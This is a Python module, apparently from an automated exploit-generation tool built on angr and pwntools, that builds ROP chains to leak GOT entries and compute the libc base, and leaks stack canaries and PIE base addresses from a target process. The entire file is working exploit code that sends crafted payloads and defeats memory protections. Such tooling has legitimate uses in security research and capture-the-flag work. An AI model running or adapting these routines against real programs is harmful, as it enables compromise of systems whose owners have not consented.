from angr import SimUnsatError
from claripy import UnsatError

from .binary_interactive import InteractiveBinary
from .utils import *
from pwn import p64, p32, u64, u32


class LeakMethod:
    def __init__(self, leak_name, leak_function, required_information, leak_target):
        # log.info(f"Leak method {leak_name} is loaded, need {required_information}.")
        self.leak_name = leak_name
        self.leak_function = leak_function
        self.required_information = required_information
        self.leak_target = leak_target
        self.available = True

    def run(self, state: angr.SimState, challenge, new_mem: list):
        log.info(f"Using leak method {self.leak_name}")
        try:
            try:
                return self.leak_function(state, challenge, new_mem)
            except AttributeError:
                raise
                log.failure(f"payload gadget unsatisfied")
        except SimUnsatError:
            log.failure(f"constraint unsatisfied")

    def satisfy(self, binary: InteractiveBinary):
        return all([i in binary.io_seg_addr for i in self.required_information]) and \
            (not all([i in binary.io_seg_addr for i in self.leak_target])) and self.available


class MitigateCanaryPuts:
    def __init__(self, payload, pattern, offset=0):
        if payload and pattern:
            self.payload = payload
            self.pattern = pattern
            self.offset = offset

    def run(self, state: angr.SimState, ___, __):
        log.info("Trying to mitigate canary.")
        binary = state.globals['binary']
        ab = binary.io_property['arch_bytes']
        try:
            binary.warped_io(state, self.payload, has_newline=False)
            rec = binary.warped_io(state)
            for _ in range(10):
                if self.pattern not in rec or len(rec.split(self.pattern)[1]) < (7 if ab == 8 else 4):
                    rec += binary.warped_io(state)
            if self.pattern in rec:
                canary = rec.split(self.pattern)[1][:7 if ab == 8 else 4].rjust(ab, b'\x00')
                log.info(f"Canary is leaked as {canary}")
                binary.io_seg_addr['Canary'] = canary
                binary.io_seg_addr['stdin_offset'] = self.offset
                return True
        except Exception as e:
            log.error(f"Error when mitigating Canary: {e}")
            raise e


class MitigatePIEPuts:
    def __init__(self, payload, pattern, offset=0):
        if payload and pattern:
            self.payload = payload
            self.pattern = pattern
            self.offset = offset

    def run(self, state: angr.SimState, __, ___):
        log.info("Trying to mitigate PIE.")
        binary = state.globals['binary']
        ab = binary.io_property['arch_bytes']
        try:
            binary.warped_io(state, self.payload, has_newline=False)
            rec = binary.warped_io(state)
            for _ in range(10):
                if self.pattern not in rec or len(rec.split(self.pattern)[1]) < (6 if ab == 8 else 4):
                    rec += binary.warped_io(state)
            if self.pattern in rec:
                base = binary.rle(rec.split(self.pattern)[1][:6 if ab == 8 else 4].ljust(ab, b'\x00'))
                if base >> 44 == 0x7:
                    base -= 243  # can be done automatically
                    log.info(f"__libc_start_main is leaked as {hex(base)}")
                    libc = ELF(binary.libc, checksec=False)
                    for k in libc.symbols:
                        if 'libc_start_main' in k:
                            libc_base = base - libc.symbols[k]
                            log.success(f"Got libc base: {hex(libc_base)}")
                            binary.io_seg_addr['libc'] = libc_base
                            binary.io_seg_addr['stdin_offset'] = self.offset
                            return True
                else:
                    if base & 0xfff < 0x500:  # mostly dynamically linked program starts after 0x500
                        base -= 0x1000
                    base &= 0xfffffffff000
                    log.success(f"Use text base: {hex(base)}")
                    binary.io_seg_addr['text'] = base
                    binary.challenge.target_binary.address = base
                    binary.io_seg_addr['stdin_offset'] = self.offset
                    return True
        except Exception as e:
            log.error(f"Error when mitigating PIE: {e}")
            raise e


def init_leaks():
    log.info("Loading leak methods.")
    return [
        LeakMethod("leak_got", _leak_got, ["text", "dynamic"], ["libc"]),
        LeakMethod("leak_got_align", _leak_got_align, ["text", "dynamic"], ["libc"]),
    ]


def _leak_got(state_raw: angr.SimState, challenge, new_mem: list, align_=False):
    binary = state_raw.globals['binary']
    log.info(f"Searching GOT for leak{' with align' if align_ else ''}.")
    state = state_raw.copy()
    if challenge.protection['PIE']:
        challenge.target_binary.address = binary.io_seg_addr['text']
    rop_chain = ROP(challenge.target_binary)
    got_can_leak = {}
    for i, addr in challenge.target_binary.got.items():
        if i in challenge.target_binary.plt:
            resolved = state.mem[addr].uint32_t.resolved if binary.arch_bytes < 5 else state.mem[addr].uint64_t.resolved
            if state.solver.is_false(resolved == challenge.target_binary.plt[i]):
                got_can_leak[i] = addr
    arch_bytes = binary.arch_bytes
    try:
        if not got_can_leak:
            got_can_leak = challenge.target_binary.got
        if got_can_leak.get("puts"):
            use_function = "puts"
            rop_chain.call("puts", [challenge.target_binary.got['puts']])
        elif got_can_leak.get("printf"):
            use_function = "printf"
            rop_chain.call("printf", [challenge.target_binary.got['printf'], 0])
        elif got_can_leak.get("write"):
            use_function = "write"
            rop_chain.call("write", [1, challenge.target_binary.got['write'], arch_bytes])
        else:
            raise PwnlibException('No leak function is available.')
        leak_rop_chain = rop_chain.chain()
        ret_main_addr = binary.io_seg_addr['text'] + binary.rop_address
        if arch_bytes == 8:
            ret = rop_chain.find_gadget(['ret']).address
            if use_function == "printf":
                leak_rop_chain += p64(ret)
            if align_:
                leak_rop_chain = p64(ret) + leak_rop_chain
            leak_rop_chain += challenge.le(ret_main_addr)
        else:
            leak_rop_chain = leak_rop_chain[:4] + p32(ret_main_addr) + leak_rop_chain[8:]
        log.info(f"Use {use_function} to leak, payload length {len(leak_rop_chain)}: {leak_rop_chain}")
        state.solver.add(state.memory.load(new_mem[0], size=len(leak_rop_chain)) == leak_rop_chain)
        payload = dump_payload(state, True)
        _ = binary.send_payload(state, payload)
        try:
            rec = binary.warped_io(state)
            function_base = ELF(binary.libc, checksec=False).sym[use_function]
            for offset in range(0, len(rec) - 4):
                if arch_bytes == 8:  # assume there at least one none-printable char
                    if all([31 < i < 127 for i in rec[offset:offset + 6]]):
                        continue
                    leak_addr = u64(rec[offset:offset + 6].ljust(8, b'\x00'))
                else:
                    leak_addr = u32(rec[offset:offset + 4])
                if (leak_addr ^ function_base) & 0xfff == 0 and leak_addr > (0xe << 28 if arch_bytes < 8 else 7 << 44):
                    log.success(f"Leak libc func address: {hex(leak_addr)}")
                    libc_base = leak_addr - function_base
                    log.success(f"Got libc base address: {hex(libc_base)}")
                    binary.io_seg_addr['libc'] = libc_base
                    tail = binary.warped_io(state, check_alive=False)
                    if tail:
                        log.info(f"Have tail: {tail}")
                    return binary
        except ValueError:
            log.failure(f"Failed to get leak address.")
    except PwnlibException:
        log.failure("No leak function is available.")
    binary.close()


def _leak_got_align(state_raw: angr.SimState, challenge, new_mem: list):
    return _leak_got(state_raw, challenge, new_mem, align_=True)
